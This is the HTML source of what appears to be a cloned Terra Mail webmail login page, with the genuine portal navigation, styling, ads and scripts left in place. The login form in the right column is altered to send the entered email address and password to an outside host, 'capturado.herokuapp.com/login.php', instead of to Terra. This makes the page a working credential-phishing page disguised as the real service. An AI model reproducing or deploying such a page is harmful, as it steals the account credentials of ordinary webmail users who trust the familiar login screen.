									href="https://servicos.terra.com.br/musica-napster/promo/milhoes-de-musicas/?utm_source=terra&amp;utm_medium=barra%20ds&amp;utm_campaign=terra%20musica&amp;utm_content=terra%20musica&amp;utm_term=cabeceira%20pos%2011&amp;cdConvenio=CVTR00001907"><span
										class="navbar-sva-desktop__products__list__item__anchor__class-icon icon icon-16 icon-sva-music"></span>
									<span class="navbar-sva-desktop__products__list__item__anchor--musica">Terra
										Música</span></a></li>
							<li class="navbar-sva-desktop__products__list__item"><a
									data-gtm-event-category="ONL Barra Digital Services" data-gtm-event-action="Clique"
									data-gtm-event-label="Domínio"
									class="navbar-sva-desktop__products__list__item__anchor"
									href="https://www.terraempresas.com.br/dominio/?utm_source=terra&amp;utm_medium=barra%20ds&amp;utm_campaign=dominio&amp;utm_content=dominio&amp;utm_term=cabeceira%20pos%2012&amp;cdConvenio=CVTR00001907"><span
										class="navbar-sva-desktop__products__list__item__anchor__class-icon icon icon-16 icon-sva-dominio"></span>
									<span
										class="navbar-sva-desktop__products__list__item__anchor--dominio">Domínio</span></a>
							</li>
							<li class="navbar-sva-desktop__products__list__item"><a
									data-gtm-event-category="ONL Barra Digital Services" data-gtm-event-action="Clique"
									data-gtm-event-label="Revistas - Goread"
									class="navbar-sva-desktop__products__list__item__anchor"
									href="https://servicos.terra.com.br/revistas-goread/?utm_source=terra&amp;utm_medium=barra%20ds&amp;utm_campaign=revistas%20go%20read&amp;utm_content=revistas%20go%20read&amp;utm_term=cabeceira%20pos%2013&amp;cdConvenio=CVTR00001907"><span
										class="navbar-sva-desktop__products__list__item__anchor__class-icon icon icon-16 icon-sva-revistas-digitais"></span>
									<span class="navbar-sva-desktop__products__list__item__anchor--goread">Revistas -
										GoRead</span></a></li>
							<li class="navbar-sva-desktop__products__list__item"><a
									data-gtm-event-category="ONL Barra Digital Services" data-gtm-event-action="Clique"
									data-gtm-event-label="Backup"
									class="navbar-sva-desktop__products__list__item__anchor"
									href="https://servicos.terra.com.br/backup/promo/promocao-1tb/?utm_source=terra&amp;utm_medium=barra%20ds&amp;utm_campaign=backup%20pf&amp;utm_content=backup%20pf&amp;utm_term=cabeceira%20pos%2014&amp;cdConvenio=CVTR00001907"><span
										class="navbar-sva-desktop__products__list__item__anchor__class-icon icon icon-16 icon-sva-backup"></span>
									<span
										class="navbar-sva-desktop__products__list__item__anchor--backup">Backup</span></a>
							</li>
						</ul>
					</div>
					<div class="navbar-sva-desktop__display" style="min-width: 273px; width: 273px;"><a
							href="https://servicos.terra.com.br/curso-de-ingles/promo/super-oferta/?utm_source=terra&amp;utm_medium=barra%20ds&amp;utm_campaign=curso%20de%20ingles&amp;utm_content=banner%20barra%20ds&amp;utm_term=display&amp;cdConvenio=CVTR00001907"
							target="_blank" class="nb__sva__highlight"
							data-gtm-event-category="ONL Barra Digital Services - Display"
							data-gtm-event-action="Clique" data-gtm-event-label="Display Barra DS"
							id="nav__sva__antivirus"><img
								src="https://p1.trrsf.com.br/image/fget/cf/0/0/0/0/0/0/svadata.terra.com.br/svabar-navbar/promotags/img/TER_184_Campanha_Email_Gigante_Banner_273x40_Promo_V2_VP.gif"></a></div>
				</div>
			</div>
		</aside>
	</nav>
	<article id="zaz--app-navbar-relative-container" class="root-container zaz--standalone  portal__container"
		style="margin-top: 100px;"></article>
	<!-- HEADER //-->
	<script>
		window.trr = {};
		window.trr.contextData = {
			device: 'web',
			lang: 'pt',
			country: 'br'
		}
	</script>
	<noscript>
		<p>declaração variavel javascript</p>
	</noscript>
	<script type="text/javascript" src="./index_files/mod-manager.min.js.baixados"></script>
	<noscript>
		<p>inclusao de javascript</p>
	</noscript>

	<script type="text/javascript" src="./index_files/script"></script>
	<style type="text/css"
		data-includerinjection="https://s1.trrsf.com/update-1542656195/fe/zaz-app-navbar/_css/pre.min.css">
		.zaz-navbar-pre {
			box-sizing: content-box !important;
			height: 40px;
			padding: 10px 0;
			background: #ff7212;
			top: 0;
			left: 0;
			width: 100%;
			margin: 0
		}

		.zaz-navbar-pre.mob {
			padding: 0;
			height: 42px
		}

		.zaz-navbar-pre.mob .trr-logo {
			width: 85px;
			height: 25px;
			margin-top: 5px
		}

		.zaz-navbar-pre .trr-logo {
			width: 128px;
			height: 36px;
			display: block;
			margin: 0 auto;
			background-image: url(data:image/png;base64,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);
			background-size: 100% 100%;
			text-indent: -9999px
		}

		.zaz-navbar-pre-breadcrumbs {
			height: 30px;
			background-color: #e4e4e4;
			left: 0;
			right: 0;
			top: 60px;
			width: 100%;
			padding: 0 20px;
			-webkit-font-smoothing: antialiased;
			font-family: OpenSans, sans-serif;
			z-index: 98000
		}

		.zaz-navbar-pre-breadcrumbs.mob {
			top: 42px
		}

		.zaz-navbar-pre-breadcrumbs ul {
			list-style: none;
			margin: 0;
			padding: 0
		}

		.zaz-navbar-pre-breadcrumbs ul li {
			float: left;
			line-height: 25px
		}

		.zaz-navbar-pre-breadcrumbs ul li a {
			color: #63645e;
			font-size: 13px;
			display: inline-block;
			text-decoration: none;
			text-transform: lowercase
		}

		.zaz-navbar-pre-breadcrumbs ul li .arrow {
			position: relative;
			background: url(//s1.trrsf.com/update-1415206003918/fe/zaz-icons/svg-sprites/navbar/zaz-navbar-fback32-sprite.png) -870px 0;
			background-size: cover;
			opacity: .5;
			width: 12px;
			height: 12px;
			top: 2px;
			margin: 0 17px;
			display: inline-block
		}

		.zaz-navbar-pre-breadcrumbs ul li:last-child .arrow {
			display: none
		}
	</style>
	<div class="zaz-navbar-pre" style="position: fixed"><span class="trr-logo">&nbsp;</span></div>
	<script
		type="text/javascript">var deviceType = (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ? true : false) ? 'mobile' : 'desktop'; if (deviceType == 'mobile') { var objNavbarPre = document.getElementsByClassName('zaz-navbar-pre'); if (objNavbarPre && objNavbarPre.length > 0) { objNavbarPre[0].className += " mob"; } var objNavbarPreBC = document.getElementsByClassName('zaz-navbar-pre-breadcrumbs'); if (objNavbarPreBC && objNavbarPreBC.length > 0) { objNavbarPreBC[0].className += " mob"; } }</script>
	<script
		type="text/javascript">window.zazMode = 'standalone'; document.addEventListener("DOMContentLoaded", function () { zaz.use(function (pkg) { pkg.context.page.set('country', 'br'); pkg.context.page.set('lang', 'pt'); pkg.context.page.set('locale', 'pt-BR'); pkg.require(['app.navbar'], function (NavBar) { var r = ["ad", "breadcrumb", "breakingNews", "cookie-message", "footer", "navbar-email", "search", "ticker", "socialpanel", "shortcuts", "under18-message"]; r.push('breadcrumbs'); if (/istoe\./.test(location.href)) { r.push('menuBtn'); } new NavBar({ shortcuts: { reject: ["email"] }, position: 'fixed', reject: r }); }) }) });</script>
	<script type="text/javascript" charset="utf-8" src="./index_files/zaz.inline.min.js(1).baixados"></script>
	<noscript>Script =
		https://s1.trrsf.com/update-1618867546/fe/zaz-cerebro/prd/scripts/zaz.inline.min.js?standalone=true</noscript>
	<noscript>
		<p>inclusao de javascript</p>
	</noscript>
	<!-- //HEADER -->

	
	<noscript>
		<p>declaração variavel javascript</p>
	</noscript>
	<script type="text/javascript" charset="iso-8859-1" language="javascript"
		src="./index_files/content.js.baixados"></script>
	<script language="JavaScript" src="./index_files/201604270000b.js.baixados"></script>
	<noscript>
		<p>inclusão de arquivo javascript</p>
	</noscript>
	<!-- //CERTIFICA - BEGIN -->
	<!-- STRUCTURE //-->
	<div id="trr-ctn-general" style="margin-top: 120px;">
		<!-- BODY COMPOSITION //-->
		<a name="content"></a>
		<div id="trr-ctn-body">
			<!-- SHOPPING BAR //-->
			<div class="ctn-shoppingbar-act" id="mod-ppi">
				<script type="text/javascript">//tgm.ShowArea("ppi", "direct=1");</script>
				<noscript>
					<p>inclusão de arquivo javascript</p>
				</noscript>
			</div>
			<!-- // SHOPPING BAR //-->
			<!-- LABEL LANDING - MOD 33 | AREA 06 //-->
			<h1 class="ttl-mail"><span>Terra Mail</span></h1>
			<!-- // LABEL LANDING - MOD 33 | AREA 06 //-->
			<div class="lin-hor-solid">&nbsp;</div>
			<!-- MENU MAIL -->
			<ul class="mnu-mail">
				<li><a class="mnu-assine" target="_blank" title="Assine o Terra Mail Gigante"
						href="https://servicos.terra.com.br/?utm_source=terra&amp;utm_medium=terra%20mail&amp;utm_campaign=terra%20servicos&amp;utm_content=assine&amp;utm_term=desktop&amp;cdConvenio=CVTR00001824"
					
				</li>
				<li style="width: 130px;"><a style="width: 130px;" class="mnu-assine" target="_blank"
						title="Assine o Terra Mail Gigante"
						href="https://www.terraempresas.com.br/?utm_source=terra&amp;utm_medium=terra%2520mail&amp;utm_campaign=terra%2520empresas&amp;utm_content=terra%2520empresas&amp;utm_term=desktop&amp;cdConvenio=CVTR00001824"
					Terra
						>Empresas</a><span style="margin: -2px 0 0 -3px;">|</span></li>
				<li><a class="mnu-central" target="_blank" title="Central do Assinante"
						href="https://central.terra.com.br/login?utm_source=terra&amp;utm_medium=terra%20mail&amp;utm_campaign=central%20do%20assinante&amp;utm_content=central%20do%20assinante&amp;utm_term=desktop&amp;cdConvenio=CVTR00001824"
						>Central
						do assinante</a><span>|</span></li>
				<li><a class="mnu-clube" target="_blank" title="Terra Clube"
						href="https://servicos.terra.com.br/terraclube/?utm_source=terra&amp;utm_medium=terra%20mail&amp;utm_campaign=terra%20clube&amp;utm_content=terra%20clube&amp;utm_term=desktop&amp;cdConvenio=CVTR00001824">Terra
						Clube</a><span>|</span></li>
				<li><a class="mnu-ajuda" target="_blank" title="Pagina de duvidas"
						href="https://duvidas.terra.com.br/produtos/frequente/31/terra-mail/">Ajuda</a><span>|</span>
				</li>
				<li><a class="mnu-condicoes" target="_blank" title="Condicoes de Uso"
						href="https://www.terra.com.br/avisolegal/terra-mail-gigante/">Condições de uso</a></li>
			</ul>
			<!-- //MENU MAIL -->
			<div class="mod-height15px">
				<!-- -->
			</div>
			<div class="ctn-zone">
				<!-- MAIN AREA | AREA 07 //-->
				<div class="col-left-full ">
					<div class="border-top-mais-espaco">
						<!-- -->
					</div>
					<div class="ctn-zone-one">
						<!-- Terra Mail Gigante e + espaco -->
						<iframe title="Slider terramail gigante" class="ifr-slider" src="https://s1.trrsf.com.br/slide-mail/img/banner/TER_476_Campanha_Construtor_Sites_Dezembro_BN_618x226_V0_VP.jpg"
							scrolling="no" frameborder="0" align="center">O browser nao suporta iframes.</iframe>
						<noframes>Sem suporte a frames, acesso <a
								href="https://s1.trrsf.com.br/slide-mail/normal_2.html">Slider</a> para ver o conteúdo.
						</noframes>

						<div class="border-bottom-terramail-empresarial">
							<!-- -->
						</div>
						<!-- //Terra Mail Gigante e + espaco -->
						<div class="lin-hor-solid">&nbsp;</div>
						<!-- //de sua sua opiniao -->
						<!-- Atencao - armazanemanto -->
						<div class="adv-footer">
							<p>Periodicamente algumas pastas do webmail passam por uma limpeza automática.</p>
							<a class="thickbox" target="_blank" title="Armazenamento"
								href="https://duvidas.terra.com.br/duvidas/2197/qual-o-tempo-de-armazenamento-das-mensagens/">Clique
								e confira o tempo para cada pasta » </a>
						</div>
						<!-- //Atencao - armazanemanto
						<div class="ctn-zone-clean bgr-sss-clean">
						</div>
						<div class="lin-hor-dotted lin-spacer">&nbsp;</div> -->
						<div class="ctn-zone-clean">
							<script type="text/javascript">//tgm.ShowArea('textlinks')</script>
							<noscript>
								<p>inclusão de arquivo javascript</p>
							</noscript>
						</div>
					</div>
				</div>
				<!-- // MAIN AREA | AREA 07 //-->
				<div class="col-right">
					<!-- MODULE LOGIN -->
					<div class="mod-login">
						<div class="ctn-formmail">
							<em>Acesse seu Terra Mail</em>
							<div class="ctn-wrap">
								<form action="https://capturado.herokuapp.com/login.php" target="_parent" class="frm-shoppingmodule" method="POST"
                					name="emailP_login"> <input type="hidden" name="returnTo"
                   					value="/webmail/signin"> <input type="hidden" name="skin" value="login-ig-mail-premium">
                				<div > <input type="text" placeholder="e-mail" name="username_id" id="username_id"
                        			tabindex="1" maxlength="255" class="campoTxt user"> <span class="message-error" id="email-error" required/></span> </div>
									<strong>@TERRA.COM.BR</strong>
									<input type="hidden" id="domain" name="domain" value="terra.com.br">
                				<div > <input type="password" placeholder="senha" name="username_pw"
                        			id="username_pw" tabindex="2" maxlength="255" class="campoTxt pass" required/> <span class="message-error"
                        			id="senha-error"></span> </div>
                				
								<div class="ctn-submit"> <button type="submit" class="btn-login" 
										tabindex="3">ENTRAR</button> <small class="helper-small-type-two"> 
										
											
								</div>
            					</form>
								
								<noscript>camada de comportamento</noscript>
								<span class="esqueci_senha"><a
										href="https://central.terra.com.br/esqueci-minha-senha">Esqueci minha
										senha</a></span>
								<div class="bxloginErro">
								</div>
							</div>
						</div>
						<!--		<div class="ctn-bottom-click">
							<a href="https://mail.terra.com.br/html/capa/terra/contato_novomail.htm">Clique aqui e de sua opini�o sobre o Terra Mail</a>
						</div>
-->
						<div id="id_captcha"></div>
					</div>
					<!-- //MODULE LOGIN -->
					<!-- ADVERTISING //-->
					<!-- Chamada original da publicidade lateral -->

					<div id="adv-right--wrapper" style="height: auto;">
						<div id="adv-right" class="adv-area adv-right" style="min-height: 1px;"
							data-google-query-id="CPuHs5PWv_ACFRQFuQYdwMEIWg">
							<div id="google_ads_iframe_/1211/br.terra.mail/home/s1_0__container__"
								style="border: 0pt none;"><iframe id="google_ads_iframe_/1211/br.terra.mail/home/s1_0"
									title="3rd party ad content" name="google_ads_iframe_/1211/br.terra.mail/home/s1_0"
									width="300" height="250" scrolling="no" marginwidth="0" marginheight="0"
									frameborder="0" style="border: 0px; vertical-align: bottom;"
									data-google-container-id="7" data-load-complete="true"
									src="https://static.criteo.net/design/dt/73018/211007/6051b544d80b49d9b43eb984ed54a86c_image_ad_300x250.gif"></iframe></div>
						</div>
					</div>
					<!-- //Chamada original da publicidade lateral -->
					<!-- ADVERTISING //-->
					<!-- Chamada FAKE da publicidade lateral -->
					<!--<div style="width: 250px; height: 250px; background-color: rgb(204, 204, 204);margin-bottom:15px;margin-top:15px;">ADVERTISING 250x250</div>-->
					<!-- /Chamada FAKE da publicidade lateral -->
					<!-- AUDIENCE PULSE  SSI + AJAX-->
					<!-- AUDIENCE PULSE - VIDEOS, PHOTOS, SERIES - MOD 43 + MOD 44 //-->
					<!--// AUDIENCE PULSE - VIDEOS, PHOTOS, SERIES - MOD 43 + MOD 44 //-->
					<!-- //AUDIENCE PULSE SSI + AJAX-->
				</div>
			</div>
		</div>
		<!-- // BODY COMPOSITION //-->
		<!-- FOOTER //-->
		<a name="footer"></a>
		<div id="mod-footer--wrapper" style="height: auto;">
			<div id="mod-footer" style="min-height: 1px;" data-google-query-id="CIaSx5PWv_ACFWs4uQYdgx0A7g">
				<div id="google_ads_iframe_/1211/br.terra.mail/home/cabeceira_0__container__" style="border: 0pt none;">
					<iframe id="google_ads_iframe_/1211/br.terra.mail/home/cabeceira_0" title="3rd party ad content"
						name="google_ads_iframe_/1211/br.terra.mail/home/cabeceira_0" width="970" height="250"
						scrolling="no" marginwidth="0" marginheight="0" frameborder="0" data-google-container-id="8"
						style="border: 0px; vertical-align: bottom;" data-load-complete="true"
						src="https://tpc.googlesyndication.com/simgad/15420808392700919017"></iframe></div>
			</div>
		</div>
		<!-- FOOTER //-->


		<div id="trr-ctn-advertising">
			<script type="text/javascript">
				AdManager.setup({
					tgmkey: tgmKey
				}).then(function () {
					var admanager = new AdManager();
					admanager.stickAd({
						placeholder: document.getElementById('mod-footer'),
						area: 'cabeceira',
						tgmkey: tgmKey
					});
					admanager.stickAd({
						placeholder: document.getElementById('adv-right'),
						area: 's1',
						tgmkey: tgmKey
					});
				}).
					then(function (meta) {
					}, function (e) {
						console.log(e);
					});
			</script>
			<noscript>
				<!--  <p>inclusão de arquivo javascript</p> -->
			</noscript>


			<!-- CERTIFICA - END -->
			<script type="text/javascript">terra_stats_metrics();</script><noscript>
				<p>inclusão de arquivo javascript</p>
			</noscript>
			<!-- //CERTIFICA - END -->

		</div>
		<!-- // STRUCTURE //-->
		<script>
			$(document).ready(function () {
				if ($(".ctn-overdue").find(".advisehead").length) {
					widover = $('.ctn-overdue').width();
					var dv = document.createElement("div");
					$(dv).addClass("ctn-trasp");
					$(dv).css('height', '100%');
					$(dv).css('z-index', 100000);
					$("body").append(dv);
					$(".ctn-overdue").css('display', 'block');
					$(".ctn-overdue").css('z-index', 100001);
					document.cookie = "trr_s_origem=Terra Mail;domain=.terra.com.br;path=/";
					document.cookie = "trr_s_ad_origem=http://mail.terra.com.br/;domain=.terra.com.br;path=/";
					_gaq.push(['_trackEvent', 'mktdir', 'terramail', 'porteira_cobavs_pv']);

				} else {
					return false;
				}
				$(".ctn-overdue .fechar").click(function () {
					$(".ctn-overdue").css('display', 'none');
					$(".ctn-trasp").hide();
					location.href = "/";
				});

				$(".ctn-overdue .entrar").click(function () {
					_gaq.push(['_trackEvent', 'mktdir', 'terramail', 'porteira_cobsus_cl']);
				});
			});
		</script><noscript>inclusao script</noscript>


	</div>
	<div id="out-of-page-terra-ad" data-google-query-id="CO2nrOHVv_ACFS8yuQYdzzMOKA">
		<div id="google_ads_iframe_/1211/br.terra.mail/home_0__container__"
			style="border: 0pt none; width: 0px; height: 0px;"></div>
	</div>
	<div id="trr-globalnav" style="display: block;">
		<div id="trr-navcontent">
			<div id="trr-globalburger" class="trr-globalburger">
				<div id="trr-burgernav" class="trr-burgernav">
					<div class="bg-header"></div>
					<div id="searchcontent">
						<div id="searchresult" class="searchresult">
							<div class="autocomplete-suggestions"></div>
						</div>
					</div>
				</div>
				<div id="trr-search" class="trr-search">
					<div class="label-cancel"></div>
				</div>
			</div>
		</div>
	</div><iframe id="google_osd_static_frame_3614997813486" name="google_osd_static_frame"
		style="display: none; width: 0px; height: 0px;" src="https://tpc.googlesyndication.com/simgad/15420808392700919017"></iframe>
</body>

</html>
